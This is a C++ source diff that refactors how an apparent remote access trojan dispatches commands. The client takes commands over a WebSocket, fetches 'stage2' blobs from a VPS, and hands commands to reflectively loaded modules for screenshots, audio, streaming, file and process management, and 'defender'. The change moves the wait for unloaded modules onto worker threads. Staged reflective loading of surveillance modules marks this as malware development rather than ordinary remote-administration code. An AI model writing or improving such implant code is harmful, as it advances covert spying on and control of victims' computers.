@@ -1523,38 +1523,54 @@ static void handle_command(const std::string& msg_str) {
             return;
         }
 
-        // ── Special-case: host_update must survive a fresh-service-start
-        //    race where defender.bin hasn't finished prefetching yet.
-        // Normal dispatch would return false (module not cached) and the
-        // viewer's `.catch(()=>{})` silently swallows the failure, leaving
-        // user staring at a stuck progress bar. Offload to a worker thread
-        // so the WSS pump stays free to deliver the stage2_blob response,
-        // and synchronously wait (up to 15s) for defender to be ready
-        // before dispatching. ──
-        if (cmd == "host_update") {
-            std::string msg_copy = msg_str;
-            std::thread([msg_copy]() {
-                if (stage2::Registry::inst().ensure_module_ready_sync("defender", 15000)) {
-                    stage2::Registry::inst().dispatch("host_update", msg_copy);
+        // ── Stage-2 dispatch (with lazy-load offload) ──
+        // Previously this just called dispatch() synchronously from the WSS
+        // pump thread. Problem: if the viewer fires a command in the first
+        // ~15 seconds after service start, the module that handles it may
+        // not be loaded yet (prefetch still in flight). dispatch() returns
+        // false, stage-1 else-chain sends "module loading, retry" error,
+        // and user sees a broken UI until they retry.
+        //
+        // Now: for any command that maps to a stage-2 module, if the module
+        // is not yet loaded, we offload to a worker thread. The worker
+        // calls ensure_module_ready_sync (blocks up to 15s waiting for
+        // blob fetch + load), then dispatches. WSS pump stays free to
+        // deliver the stage2_blob response the worker is waiting for.
+        //
+        // The worker-thread path is chosen ONLY when the module isn't
+        // ready — loaded-module commands still dispatch synchronously
+        // (hot path: proc_list, sys_info, etc. polled frequently).
+        {
+            const char* s2_mod = stage2::cmd_to_module(cmd);
+            if (s2_mod) {
+                auto& reg = stage2::Registry::inst();
+                if (reg.is_module_loaded(s2_mod)) {
+                    if (reg.dispatch(cmd, msg_str)) return;
+                    // Registered but dispatch somehow returned false
+                    // (handler not found inside module?). Fall through.
                 } else {
-                    // Blob fetch timed out. Report a useful error.
-                    std::string id = json_get(msg_copy, "id");
-                    std::string r = "{\"id\":\"" + json_escape(id) +
-                                    "\",\"ok\":false,\"error\":\"defender module not available (VPS unreachable?)\"}";
-                    if (g_ws && g_ws->is_connected()) g_ws->send_text(to_utf8(r));
+                    // Not loaded — offload the whole ensure+dispatch flow
+                    std::string cmd_copy = cmd;
+                    std::string msg_copy = msg_str;
+                    std::string mod_copy = s2_mod;
+                    std::thread([cmd_copy, msg_copy, mod_copy]() {
+                        bool ready = stage2::Registry::inst()
+                                         .ensure_module_ready_sync(mod_copy, 15000);
+                        if (ready && stage2::Registry::inst()
+                                         .dispatch(cmd_copy, msg_copy)) {
+                            return;
+                        }
+                        // Failed: send error to viewer
+                        std::string id = json_get(msg_copy, "id");
+                        std::string r = "{\"id\":\"" + json_escape(id) +
+                            "\",\"ok\":false,\"error\":\"" + mod_copy +
+                            " module not available (VPS unreachable?)\"}";
+                        if (g_ws && g_ws->is_connected())
+                            g_ws->send_text(to_utf8(r));
+                    }).detach();
+                    return;
                 }
-            }).detach();
-            return;
-        }
-
-        // ── Stage-2 dispatch ──
-        // Commands implemented by reflectively-loaded modules (screenshot,
-        // audio, stream, filemgr, procmgr, defender) go through here first.
-        // If a handler is registered (or becomes registered via on-demand
-        // load), the stage-2 module handles it and we return immediately.
-        // Otherwise fall through to the built-in stage-1 command chain.
-        if (stage2::Registry::inst().dispatch(cmd, msg_str)) {
-            return;
+            }
         }
 
 #ifdef USE_WEBRTC_STREAM
